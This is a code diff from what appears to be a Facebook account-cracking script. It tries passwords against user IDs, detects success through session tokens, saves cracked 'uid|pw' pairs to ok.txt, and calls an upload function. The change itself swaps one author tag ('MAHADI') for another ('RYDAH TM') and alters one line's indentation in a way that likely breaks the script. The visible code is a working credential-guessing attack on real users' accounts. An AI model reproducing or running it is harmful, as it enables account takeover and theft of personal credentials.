@@ -93,7 +93,7 @@ class Main:
 			exit()
 		os.system("clear")
 		
-		print ("""\033[1;91m  ╔═══╗╔╗  ╔╗╔═══╗╔═══╗╔╗ ╔╗    ╔════╗╔═╗╔═╗
+    print ("""\033[1;91m  ╔═══╗╔╗  ╔╗╔═══╗╔═══╗╔╗ ╔╗    ╔════╗╔═╗╔═╗
 \033[1;92m                ║╔═╗║║╚╗╔╝║╚╗╔╗║║╔═╗║║║ ║║    ║╔╗╔╗║║║╚╝║║
 \033[1;93m                ║╚═╝║╚╗╚╝╔╝ ║║║║║║ ║║║╚═╝║    ╚╝║║╚╝║╔╗╔╗║
 \033[1;94m                ║╔╗╔╝ ╚╗╔╝  ║║║║║╚═╝║║╔═╗║      ║║  ║║║║║║
@@ -377,7 +377,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s\033[0;93m[>_] [RYDAH] : \033[0;97m %s/%s -> \033[0;92m [MAHADI -OK:%s ]- \033[0;93m[RYDAH TM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s\033[0;93m[>_] [RYDAH] : \033[0;97m %s/%s -> \033[0;92m [RYDAH TM -OK:%s ]- \033[0;93m[RYDAH TM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -396,7 +396,7 @@ class Main:
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[RYDAH TM-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [MAHADI-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [RYDAH TM-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
